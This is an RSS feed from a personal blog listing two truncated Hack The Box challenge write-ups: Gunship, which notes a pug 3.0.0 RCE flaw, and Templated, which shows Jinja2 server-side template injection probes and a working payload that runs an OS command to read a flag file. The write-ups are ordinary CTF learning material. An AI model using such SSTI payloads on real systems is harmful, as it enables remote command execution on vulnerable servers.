<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>challenges on Harshit Maheshwari</title>
    <link>https://harshitm98.github.io/tags/challenges/</link>
    <description>Recent content in challenges on Harshit Maheshwari</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
    <lastBuildDate>Mon, 27 Dec 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://harshitm98.github.io/tags/challenges/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HTB Gunship - Writeup</title>
      <link>https://harshitm98.github.io/posts/htb-challenge-gunship/</link>
      <pubDate>Mon, 27 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://harshitm98.github.io/posts/htb-challenge-gunship/</guid>
      <description>Access details -&amp;gt; 159.65.31.1:32618
We are provided with a website which has only one input field and we have the source code available.
So let&amp;rsquo;s go through the source code which is made available to us.
Quick Recon  Packages installed (package.json)  &amp;#34;dependencies&amp;#34;: { &amp;#34;express&amp;#34;: &amp;#34;^4.17.1&amp;#34;, &amp;#34;flat&amp;#34;: &amp;#34;5.0.0&amp;#34;, &amp;#34;pug&amp;#34;: &amp;#34;^3.0.0&amp;#34; }  We have pug:3.0.0 which is vulnerable to RCE. Source: https://github.com/pugjs/pug/issues/3312    Location of vulnerability (routes/index.js)  const pug = require(&amp;#39;pug&amp;#39;); .</description>
    </item>
    
    <item>
      <title>HTB Templated - Writeup</title>
      <link>https://harshitm98.github.io/posts/htb-challenge-templated/</link>
      <pubDate>Sun, 26 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://harshitm98.github.io/posts/htb-challenge-templated/</guid>
      <description>Navigating through the website Requested: GET /invalid -&amp;gt; we got invalid
Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&amp;gt; we got invalid49 instead of invalid{{7*7}}
We know that it is Jinja2 and Flask, so we can use their payload.
Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&amp;gt; we got the flag
Alternative Finding subprocess.Popen index.
 GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&amp;gt; Popen is there in the list GET /{{&#39;&#39;.</description>
    </item>
    
  </channel>
</rss>
